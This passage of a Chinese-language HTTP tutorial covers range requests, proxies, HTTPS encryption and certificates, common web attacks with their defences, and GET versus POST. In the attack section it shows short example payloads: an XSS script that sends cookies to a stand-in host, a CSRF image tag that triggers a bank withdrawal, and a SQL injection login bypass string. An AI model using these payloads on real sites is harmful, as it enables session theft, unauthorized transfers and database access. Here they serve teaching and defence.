；这样的话，缓存服务器就可以对资源的不同展现形式进行缓存。</p><h2 id="范围请求"><a href="#范围请求" class="headerlink" title="范围请求"></a>范围请求</h2><p>如果网络出现中断，服务器只发送了一部分数据，范围请求可以使得客户端只请求未发送的那部分数据，从而避免服务器重新发送所有数据。</p><h3 id="1-Range"><a href="#1-Range" class="headerlink" title="1. Range"></a>1. Range</h3><p>在请求报文中添加 Range 首部字段指定请求的范围。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /z4d4kWk.jpg HTTP/1.1</span><br><span class="line">Host: i.imgur.com</span><br><span class="line">Range: bytes=0-1023</span><br></pre></td></tr></table></figure><p>请求成功的话服务器返回的响应包含 206 Partial Content 状态码。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 206 Partial Content</span><br><span class="line">Content-Range: bytes 0-1023/146515</span><br><span class="line">Content-Length: 1024</span><br><span class="line">...</span><br><span class="line">(binary content)</span><br></pre></td></tr></table></figure><h3 id="2-Accept-Ranges"><a href="#2-Accept-Ranges" class="headerlink" title="2. Accept-Ranges"></a>2. Accept-Ranges</h3><p>响应首部字段 Accept-Ranges 用于告知客户端是否能处理范围请求，可以处理使用 bytes，否则使用 none。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Accept-Ranges: bytes</span><br></pre></td></tr></table></figure><h3 id="3-响应"><a href="#3-响应" class="headerlink" title="3. 响应"></a>3. 响应</h3><ul><li>在请求成功的情况下，服务器会返回 206 Partial Content 状态码。</li><li>在请求的范围越界的情况下，服务器会返回 416 Requested Range Not Satisfiable 状态码。</li><li>在不支持范围请求的情况下，服务器会返回 200 OK 状态码。</li></ul><h2 id="分块传输编码"><a href="#分块传输编码" class="headerlink" title="分块传输编码"></a>分块传输编码</h2><p>Chunked Transfer Coding，可以把数据分割成多块，让浏览器逐步显示页面。</p><h2 id="多部分对象集合"><a href="#多部分对象集合" class="headerlink" title="多部分对象集合"></a>多部分对象集合</h2><p>一份报文主体内可含有多种类型的实体同时发送，每个部分之间用 boundary 字段定义的分隔符进行分隔，每个部分都可以有首部字段。</p><p>例如，上传多个表单时可以使用如下方式：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: multipart/form-data; boundary=AaB03x</span><br><span class="line"></span><br><span class="line">--AaB03x</span><br><span class="line">Content-Disposition: form-data; name="submit-name"</span><br><span class="line"></span><br><span class="line">Larry</span><br><span class="line">--AaB03x</span><br><span class="line">Content-Disposition: form-data; name="files"; filename="file1.txt"</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">... contents of file1.txt ...</span><br><span class="line">--AaB03x--</span><br></pre></td></tr></table></figure><h2 id="虚拟主机"><a href="#虚拟主机" class="headerlink" title="虚拟主机"></a>虚拟主机</h2><p>HTTP/1.1 使用虚拟主机技术，使得一台服务器拥有多个域名，并且在逻辑上可以看成多个服务器。</p><h2 id="通信数据转发"><a href="#通信数据转发" class="headerlink" title="通信数据转发"></a>通信数据转发</h2><h3 id="1-代理"><a href="#1-代理" class="headerlink" title="1. 代理"></a>1. 代理</h3><p>代理服务器接受客户端的请求，并且转发给其它服务器。</p><p>使用代理的主要目的是：缓存、网络访问控制以及访问日志记录。</p><p>代理服务器分为正向代理和反向代理两种，用户察觉得到正向代理的存在，而反向代理一般位于内部网络中，用户察觉不到。</p><p><div align="center"> <img src="/images/posts/a314bb79-5b18-4e63-a976-3448bffa6f1b.png" width=""> </div><br></p><p><div align="center"> <img src="/images/posts/2d09a847-b854-439c-9198-b29c65810944.png" width=""> </div><br></p><h3 id="2-网关"><a href="#2-网关" class="headerlink" title="2. 网关"></a>2. 网关</h3><p>与代理服务器不同的是，网关服务器会将 HTTP 转化为其它协议进行通信，从而请求其它非 HTTP 服务器的服务。</p><h3 id="3-隧道"><a href="#3-隧道" class="headerlink" title="3. 隧道"></a>3. 隧道</h3><p>使用 SSL 等加密手段，为客户端和服务器之间建立一条安全的通信线路。</p><h1 id="六、HTTPs"><a href="#六、HTTPs" class="headerlink" title="六、HTTPs"></a>六、HTTPs</h1><p>HTTP 有以下安全性问题：</p><ol><li>使用明文进行通信，内容可能会被窃听；</li><li>不验证通信方的身份，通信方的身份有可能遭遇伪装；</li><li>无法证明报文的完整性，报文有可能遭篡改。</li></ol><p>HTTPs 并不是新协议，而是让 HTTP 先和 SSL（Secure Sockets Layer）通信，再由 SSL 和 TCP 通信。也就是说 HTTPs 使用了隧道进行通信。</p><p>通过使用 SSL，HTTPs 具有了加密（防窃听）、认证（防伪装）和完整性保护（防篡改）。</p><p><div align="center"> <img src="/images/posts/ssl-offloading.jpg" width="700"> </div><br></p><h2 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h2><h3 id="1-对称密钥加密"><a href="#1-对称密钥加密" class="headerlink" title="1. 对称密钥加密"></a>1. 对称密钥加密</h3><p>对称密钥加密（Symmetric-Key Encryption），加密的加密和解密使用同一密钥。</p><ul><li>优点：运算速度快；</li><li>缺点：密钥容易被获取。</li></ul><p><div align="center"> <img src="/images/posts/7fffa4b8-b36d-471f-ad0c-a88ee763bb76.png" width="600"> </div><br></p><h3 id="2-公开密钥加密"><a href="#2-公开密钥加密" class="headerlink" title="2. 公开密钥加密"></a>2. 公开密钥加密</h3><p>公开密钥加密（Public-Key Encryption），也称为非对称密钥加密，使用一对密钥用于加密和解密，分别为公开密钥和私有密钥。公开密钥所有人都可以获得，通信发送方获得接收方的公开密钥之后，就可以使用公开密钥进行加密，接收方收到通信内容后使用私有密钥解密。</p><ul><li>优点：更为安全；</li><li>缺点：运算速度慢；</li></ul><p><div align="center"> <img src="/images/posts/39ccb299-ee99-4dd1-b8b4-2f9ec9495cb4.png" width="600"> </div><br></p><h3 id="3-HTTPs-采用的加密方式"><a href="#3-HTTPs-采用的加密方式" class="headerlink" title="3. HTTPs 采用的加密方式"></a>3. HTTPs 采用的加密方式</h3><p>HTTPs 采用混合的加密机制，使用公开密钥加密用于传输对称密钥来保证安全性，之后使用对称密钥加密进行通信来保证效率。（下图中的 Session Key 就是对称密钥）</p><p><div align="center"> <img src="/images/posts/How-HTTPS-Works.png" width="600"> </div><br></p><h2 id="认证"><a href="#认证" class="headerlink" title="认证"></a>认证</h2><p>通过使用  <strong>证书</strong>  来对通信方进行认证。</p><p>数字证书认证机构（CA，Certificate Authority）是客户端与服务器双方都可信赖的第三方机构。服务器的运营人员向 CA 提出公开密钥的申请，CA 在判明提出申请者的身份之后，会对已申请的公开密钥做数字签名，然后分配这个已签名的公开密钥，并将该公开密钥放入公开密钥证书后绑定在一起。</p><p>进行 HTTPs 通信时，服务器会把证书发送给客户端。客户端取得其中的公开密钥之后，先使用数字签名进行验证，如果验证通过，就可以开始通信了。</p><p><div align="center"> <img src="/images/posts/2017-06-11-ca.png" width=""> </div><br></p><h2 id="完整性保护"><a href="#完整性保护" class="headerlink" title="完整性保护"></a>完整性保护</h2><p>SSL 提供报文摘要功能来进行完整性保护。</p><p>HTTP 也提供了 MD5 报文摘要功能，但是却不是安全的。例如报文内容被篡改之后，同时重新计算 MD5 的值，通信接收方是无法意识到发生篡改。</p><p>HTTPs 的报文摘要功能之所以安全，是因为它结合了加密和认证这两个操作。试想一下，加密之后的报文，遭到篡改之后，也很难重新计算报文摘要，因为无法轻易获取明文。</p><h2 id="HTTPs-的缺点"><a href="#HTTPs-的缺点" class="headerlink" title="HTTPs 的缺点"></a>HTTPs 的缺点</h2><ul><li>因为需要进行加密解密等过程，因此速度会更慢；</li><li>需要支付证书授权的高费用。</li></ul><h2 id="配置-HTTPs"><a href="#配置-HTTPs" class="headerlink" title="配置 HTTPs"></a>配置 HTTPs</h2><p><a href="https://aotu.io/notes/2016/08/16/nginx-https/index.html" target="_blank" rel="noopener">Nginx 配置 HTTPS 服务器</a></p><h1 id="七、Web-攻击技术"><a href="#七、Web-攻击技术" class="headerlink" title="七、Web 攻击技术"></a>七、Web 攻击技术</h1><h2 id="跨站脚本攻击"><a href="#跨站脚本攻击" class="headerlink" title="跨站脚本攻击"></a>跨站脚本攻击</h2><h3 id="1-概念"><a href="#1-概念" class="headerlink" title="1. 概念"></a>1. 概念</h3><p>跨站脚本攻击（Cross-Site Scripting, XSS），可以将代码注入到用户浏览的网页上，这种代码包括 HTML 和 JavaScript。利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和 Cookie 等各种内容。</p><p>例如有一个论坛网站，攻击者可以在上面发布以下内容：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">location.href=<span class="string">"//domain.com/?c="</span> + <span class="built_in">document</span>.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>之后该内容可能会被渲染成以下形式：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">location.href=<span class="string">"//domain.com/?c="</span> + <span class="built_in">document</span>.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>另一个用户浏览了含有这个内容的页面将会跳往 domain.com 并携带了当前作用域的 Cookie。如果这个论坛网站通过 Cookie 管理用户登录状态，那么攻击者就可以通过这个 Cookie 登录被攻击者的账号了。</p><h3 id="2-危害"><a href="#2-危害" class="headerlink" title="2. 危害"></a>2. 危害</h3><ul><li>窃取用户的 Cookie 值</li><li>伪造虚假的输入表单骗取个人信息</li><li>显示伪造的文章或者图片</li></ul><h3 id="3-防范手段"><a href="#3-防范手段" class="headerlink" title="3. 防范手段"></a>3. 防范手段</h3><p>（一）设置 Cookie 为 HttpOnly</p><p>设置了 HttpOnly 的 Cookie 可以防止 JavaScript 脚本调用，在一定程度上可以防止 XSS 攻击窃取用户的 Cookie 信息。</p><p>（二）过滤特殊字符</p><p>许多语言都提供了对 HTML 的过滤：</p><ul><li>PHP 的 htmlentities() 或是 htmlspecialchars()。</li><li>Python 的 cgi.escape()。</li><li>Java 的 xssprotect (Open Source Library)。</li><li>Node.js 的 node-validator。</li></ul><p>例如 htmlspecialchars() 可以将 <code>&lt;</code> 转义为 <code>&amp;lt;</code>，将 <code>&gt;</code> 转义为 <code>&amp;gt;</code>，从而避免 HTML 和 Jascript 代码的运行。</p><p>（三）富文本编辑器的处理</p><p>富文本编辑器允许用户输入 HTML 代码，就不能简单地将 <code>&lt;</code> 等字符进行过滤了，极大地提高了 XSS 攻击的可能性。</p><p>富文本编辑器通常采用 XSS filter 来防范 XSS 攻击，可以定义一些标签白名单或者黑名单，从而不允许有攻击性的 HTML 代码的输入。</p><p>以下例子中，form 和 script 等标签都被转义，而 h 和 p 等标签将会保留。</p><p><a href="http://jsxss.com/zh/try.html" target="_blank" rel="noopener">XSS 过滤在线测试</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">"title"</span>&gt;</span>XSS Demo<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"text-center"</span>&gt;</span></span><br><span class="line">Sanitize untrusted HTML (to prevent XSS) with a configuration specified by a Whitelist.</span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"q"</span> <span class="attr">value</span>=<span class="string">"test"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">"submit"</span>&gt;</span>Submit<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">pre</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://jsxss.com"</span>&gt;</span>http<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>Features:<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>Specifies HTML tags and their attributes allowed with whitelist<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>Handle any tags or attributes using custom function<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">alert(<span class="regexp">/xss/</span>);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>XSS Demo<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">Sanitize untrusted HTML (to prevent XSS) with a configuration specified by a Whitelist.</span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&amp;lt;form&amp;gt;</span><br><span class="line">  &amp;lt;input type="text" name="q" value="test"&amp;gt;</span><br><span class="line">  &amp;lt;button id="submit"&amp;gt;Submit&amp;lt;/button&amp;gt;</span><br><span class="line">&amp;lt;/form&amp;gt;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">pre</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://jsxss.com"</span>&gt;</span>http<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>Features:<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>Specifies HTML tags and their attributes allowed with whitelist<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>Handle any tags or attributes using custom function<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&amp;lt;script type="text/javascript"&amp;gt;</span><br><span class="line">alert(/xss/);</span><br><span class="line">&amp;lt;/script&amp;gt;</span><br></pre></td></tr></table></figure><h2 id="跨站点请求伪造"><a href="#跨站点请求伪造" class="headerlink" title="跨站点请求伪造"></a>跨站点请求伪造</h2><h3 id="1-概念-1"><a href="#1-概念-1" class="headerlink" title="1. 概念"></a>1. 概念</h3><p>跨站点请求伪造（Cross-site request forgery，CSRF），是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。这利用了 Web 中用户身份验证的一个漏洞：简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。</p><p>XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。</p><p>假如一家银行用以执行转账操作的 URL 地址如下：</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.examplebank.com/withdraw</span>?account=AccoutName&amp;amount=<span class="number">1000</span>&amp;<span class="keyword">for</span>=PayeeName。</span><br></pre></td></tr></table></figure><p>那么，一个恶意攻击者可以在另一个网站上放置如下代码：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="params">&lt;img src="http://www.examplebank.com/withdraw?account=Alice<span class="variable">&amp;amount</span>=<span class="number">1000</span><span class="variable">&amp;for</span>=Badman"&gt;</span>。</span><br></pre></td></tr></table></figure><p>如果有账户名为 Alice 的用户访问了恶意站点，而她之前刚访问过银行不久，登录信息尚未过期，那么她就会损失 1000 资金。</p><p>这种恶意的网址可以有很多种形式，藏身于网页中的许多地方。此外，攻击者也不需要控制放置恶意网址的网站。例如他可以将这种地址藏在论坛，博客等任何用户生成内容的网站中。这意味着如果服务器端没有合适的防御措施的话，用户即使访问熟悉的可信网站也有受攻击的危险。</p><p>透过例子能够看出，攻击者并不能通过 CSRF 攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户浏览器，让其以用户的名义执行操作。</p><h3 id="2-防范手段"><a href="#2-防范手段" class="headerlink" title="2. 防范手段"></a>2. 防范手段</h3><p>（一）检查 Referer 字段</p><p>HTTP 头中有一个 Referer 字段，这个字段用以标明请求来源于哪个地址。在处理敏感数据请求时，通常来说，Referer 字段应和请求的地址位于同一域名下。</p><p>这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的 Referer 字段。虽然 HTTP 协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其 Referer 字段的可能。</p><p>（二）添加校验 Token</p><p>由于 CSRF 的本质在于攻击者欺骗用户去访问自己设置的地址，所以如果要求在访问敏感数据请求时，要求用户浏览器提供不保存在 Cookie 中，并且攻击者无法伪造的数据作为校验，那么攻击者就无法再执行 CSRF 攻击。这种数据通常是表单中的一个数据项。服务器将其生成并附加在表单中，其内容是一个伪乱数。当客户端通过表单提交请求时，这个伪乱数也一并提交上去以供校验。正常的访问时，客户端浏览器能够正确得到并传回这个伪乱数，而通过 CSRF 传来的欺骗性攻击中，攻击者无从事先得知这个伪乱数的值，服务器端就会因为校验 Token 的值为空或者错误，拒绝这个可疑请求。</p><p>也可以要求用户输入验证码来进行校验。</p><h2 id="SQL-注入攻击"><a href="#SQL-注入攻击" class="headerlink" title="SQL 注入攻击"></a>SQL 注入攻击</h2><h3 id="1-概念-2"><a href="#1-概念-2" class="headerlink" title="1. 概念"></a>1. 概念</h3><p>服务器上的数据库运行非法的 SQL 语句，主要通过拼接来完成。</p><h3 id="2-攻击原理"><a href="#2-攻击原理" class="headerlink" title="2. 攻击原理"></a>2. 攻击原理</h3><p>例如一个网站登录验证的 SQL 查询代码为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strSQL = "<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> (<span class="keyword">name</span> = <span class="string">'" + userName + "'</span>) <span class="keyword">and</span> (pw = <span class="string">'"+ passWord +"'</span>);"</span><br></pre></td></tr></table></figure><p>如果填入以下内容：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">userName = "1' OR '1'='1";</span><br><span class="line">passWord = "1' OR '1'='1";</span><br></pre></td></tr></table></figure><p>那么 SQL 查询字符串为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strSQL = "<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> (<span class="keyword">name</span> = <span class="string">'1'</span> <span class="keyword">OR</span> <span class="string">'1'</span>=<span class="string">'1'</span>) <span class="keyword">and</span> (pw = <span class="string">'1'</span> <span class="keyword">OR</span> <span class="string">'1'</span>=<span class="string">'1'</span>);"</span><br></pre></td></tr></table></figure><p>此时无需验证通过就能执行以下查询：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strSQL = "<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span>;"</span><br></pre></td></tr></table></figure><h3 id="3-防范手段-1"><a href="#3-防范手段-1" class="headerlink" title="3. 防范手段"></a>3. 防范手段</h3><p>（一）使用参数化查询</p><p>以下以 Java 中的 PreparedStatement 为例，它是预先编译的 SQL 语句，可以并且传入适当参数多次执行。由于没有拼接的过程，因此可以防止 SQL 注入的发生。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PreparedStatement stmt = connection.prepareStatement(<span class="string">"SELECT * FROM users WHERE userid=? AND password=?"</span>);</span><br><span class="line">stmt.setString(<span class="number">1</span>, userid);</span><br><span class="line">stmt.setString(<span class="number">2</span>, password);</span><br><span class="line">ResultSet rs = stmt.executeQuery();</span><br></pre></td></tr></table></figure><p>（二）单引号转换</p><p>将传入的参数中的单引号转换为连续两个单引号，PHP 中的 Magic quote 可以完成这个功能。</p><h2 id="拒绝服务攻击"><a href="#拒绝服务攻击" class="headerlink" title="拒绝服务攻击"></a>拒绝服务攻击</h2><p>拒绝服务攻击（denial-of-service attack，DoS），亦称洪水攻击，其目的在于使目标电脑的网络或系统资源耗尽，使服务暂时中断或停止，导致其正常用户无法访问。</p><p>分布式拒绝服务攻击（distributed denial-of-service attack，DDoS），指攻击者使用网络上两个或以上被攻陷的电脑作为“僵尸”向特定的目标发动“拒绝服务”式攻击。</p><blockquote><p><a href="https://zh.wikipedia.org/wiki/%E9%98%BB%E6%96%B7%E6%9C%8D%E5%8B%99%E6%94%BB%E6%93%8A" target="_blank" rel="noopener">维基百科：拒绝服务攻击</a></p></blockquote><h1 id="八、GET-和-POST-的区别"><a href="#八、GET-和-POST-的区别" class="headerlink" title="八、GET 和 POST 的区别"></a>八、GET 和 POST 的区别</h1><h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><p>GET 用于获取资源，而 POST 用于传输实体主体。</p><h2 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h2><p>GET 和 POST 的请求都能使用额外的参数，但是 GET 的参数是以查询字符串出现在 URL 中，而 POST 的参数存储在实体主体中。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/test/demo_form.asp?name1=value1&amp;name2=value2</span> HTTP/1.1</span><br></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /test/demo_form<span class="selector-class">.asp</span> HTTP/<span class="number">1.1</span></span><br><span class="line">Host: w3schools.com</span><br><span class="line">name1=value1&amp;name2=value2</span><br></pre></td></tr></table></figure><p>不能因为 POST 参数存储在实体主体中就认为它的安全性更高，因为照样可以通过一些抓包工具（Fiddler）查看。</p><p>因为 URL 只支持 ASCII 码，因此 GET 的参数中如果存在中文等字符就需要先进行编码，例如<code>中文</code>会转换为<code>%E4%B8%AD%E6%96%87</code>，而空格会转换为<code>%20</code>。POST 支持标准字符集。</p><h2 id="安全"><a href="#安全" class="headerlink" title="安全"></a>安全</h2><p>安全的 HTTP 方法不会改变服务器状态，也就是说它只是可读的。</p><p>GET 方法是安全的，而 POST 却不是，因为 POST 的目的是传送实体主体内容，这个内容可能是用户上传的表单数据，上传成功之后，服务器可能把这个数据存储到数据库中，因此状态也就发生了改变。</p><p>安全的方法除了 GET 之外还有：HEAD、OPTIONS。</p><p>不安全的方法除了 POST 之外还有 PUT、DELETE。</p><h2 id="幂等性"><a href="#幂等性" class="headerlink" title="幂等性"></a>幂等性</h2><p>幂等的 HTTP 方法，同样的请求被执行一次与连续执行多次的效果是一样的，服务器的状态也是一样的。换句话说就是，幂等方法不应该具有副作用（统计用途除外）。在正确实现的条件下，GET，HEAD，PUT 和 DELETE 等方法都是幂等的，而 POST 方法不是。所有的安全方法也都是幂等的。</p><p>GET /pageX HTTP/1.1 是幂等的。连续调用多次，客户端接收到的结果都是一样的：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/pageX</span> HTTP/1.1</span><br><span class="line"><span class="keyword">GET</span> <span class="string">/pageX</span> HTTP/1.1</span><br><span class="line"><span class="keyword">GET</span> <span class="string">/pageX</span> HTTP/1.1</span><br><span class="line"><span class="keyword">GET</span> <span class="string">/pageX</span> HTTP/1.1</span><br></pre></td></tr></table></figure><p>POST /add_row HTTP/1.1 不是幂等的。如果调用多次，就会增加多行记录：</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">POST</span> /<span class="keyword">add_row </span>HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="symbol">POST</span> /<span class="keyword">add_row </span>HTTP/<span class="number">1</span>.<span class="number">1</span>   -&gt; <span class="keyword">Adds </span>a <span class="number">2</span>nd row</span><br><span class="line"><span class="symbol">POST</span> /<span class="keyword">add_row </span>HTTP/<span class="number">1</span>.<span class="number">1</span>   -&gt; <span class="keyword">Adds </span>a <span class="number">3</span>rd row</span><br></pre></td></tr></table></figure><p>DELETE /idX/delete HTTP/1.1 是幂等的，即便是不同请求之间接收到的状态码不一样：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> /idX/<span class="keyword">delete</span> <span class="keyword">HTTP</span>/<span class="number">1.1</span>   -&gt; <span class="keyword">Returns</span> <span class="number">200</span> <span class="keyword">if</span> idX <span class="keyword">exists</span></span><br><span class="line"><span class="keyword">DELETE</span> /idX/<span class="keyword">delete</span> <span class="keyword">HTTP</span>/<span class="number">1.1</span>   -&gt; <span class="keyword">Returns</span> <span class="number">404</span> <span class="keyword">as</span> it just got deleted</span><br><span class="line"><span class="keyword">DELETE</span> /idX/<span class="keyword">delete</span> <span class="keyword">HTTP</span>/<span class="number">1.1</span>   -&gt; <span class="keyword">Returns</span> <span class="number">404</span></span><br></pre></td></tr></table></figure><h2 id="可缓存"><a href="#可缓存" class="headerlink" title="可缓存"></a>可缓存</h2><p>如果要对响应进行缓存，需要满足以下条件：</p><ol><li>请求报文的 HTTP 方法本身是可缓存的，包括 GET 和 HEAD，但是 